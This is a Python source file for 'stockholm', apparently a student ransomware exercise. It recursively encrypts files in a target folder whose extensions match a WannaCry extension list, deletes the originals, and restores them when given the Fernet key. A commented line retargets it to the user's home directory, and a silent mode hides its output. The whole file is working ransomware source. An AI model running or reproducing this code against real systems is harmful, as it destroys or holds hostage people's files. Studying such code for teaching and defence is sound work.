import argparse
import os, sys
from os.path import isdir
from cryptography.fernet import Fernet
from pathlib import Path


def parser():
    parser = argparse.ArgumentParser(
        prog='stockholm',
        description='Surprise jiji'
    )
    parser.add_argument(
        '-v',
        dest='version',
        default="1.0",
        help="shows program version.",
    )
    parser.add_argument(
        '-r', '--reverse',
        metavar='KEY', dest='key',
        type=str,
        help="key used to decrypt files."
    )
    parser.add_argument(
        '-s', '--silent',
        default=False, action='store_true',
        help="hide program output.",
    )
    return parser.parse_args()


INFECT_FOLDER_NAME = "infection"
ENCRYPTED_EXT = ".ft"

STOCKHOLM_LOCATION = Path(__file__).resolve().parent
BASE_INFECT_FOLDER = f"{STOCKHOLM_LOCATION}/{INFECT_FOLDER_NAME}" # REMOVE FOR FINAL VERSION
# BASE_INFECT_FOLDER = f"{Path.home()}/{INFECT_FOLDER_NAME}" # ENABLE FOR FINAL VERSION


def backup_key(key):
    with open(f"{STOCKHOLM_LOCATION}/stockholm.key", 'wb') as backup_key:
        backup_key.write(key)


WANNACRY_TARGETS = [
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2",
    ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc",
    ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd",
    ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd",
    ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp",
    ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob",
    ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u",
    ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png",
    ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar",
    ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx",
    ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf",
    ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam",
    ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt",
    ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc",
]

def encrypt_file(file_path:str, file:str):
    extension = Path(file_path).suffix
    if extension not in WANNACRY_TARGETS:
        return
    with open(file_path, 'rb') as file_read:
        raw_data = file_read.read()
    with open(file_path+ENCRYPTED_EXT, 'wb') as file_write:
        file_write.write(f.encrypt(raw_data))
    print(f"Encrypted -> {file}")
    os.remove(file_path)


def encrypt_folder(folder_name:str=BASE_INFECT_FOLDER):
    print(f"---- {folder_name} ----")

    files = os.listdir(folder_name)
    for file in files:
        file_path = folder_name + "/" + file
        if isdir(file_path):
            # print(f"_dir: {file}")
            encrypt_folder(file_path)
        else:
            # print(f"_file: {file}")
            encrypt_file(file_path, file)


def decrypt_file(file_path:str, file:str):
    extension = Path(file_path).suffix
    if extension == ENCRYPTED_EXT:
        with open(file_path, 'rb') as file_read:
            raw_data = file_read.read()
        with open(file_path.removesuffix(ENCRYPTED_EXT), 'wb') as file_write:
            file_write.write(f.decrypt(raw_data))
        print(f"Decrypted -> {file}")
        os.remove(file_path)


def decrypt_folder(folder_name:str=BASE_INFECT_FOLDER):
    print(f"---- {folder_name} ----")

    files = os.listdir(folder_name)
    for file in files:
        file_path = folder_name + "/" + file
        if isdir(file_path):
            # print(f"_dir: {file}")
            decrypt_folder(file_path)
        else:
            # print(f"_file: {file}")
            decrypt_file(file_path, file)

if __name__ == '__main__':
    global args
    args = parser()

    if args.silent == True:
        file_devnull = open(os.devnull, 'w')
        sys.stdout = file_devnull
        # sys.stderr = file_devnull

    global key
    global f

    if args.key is not None:
        key = args.key
    else:
        key = Fernet.generate_key()
        backup_key(key)

    f = Fernet(key)
    
    if args.key is not None:
        decrypt_folder()
    else:
        encrypt_folder()
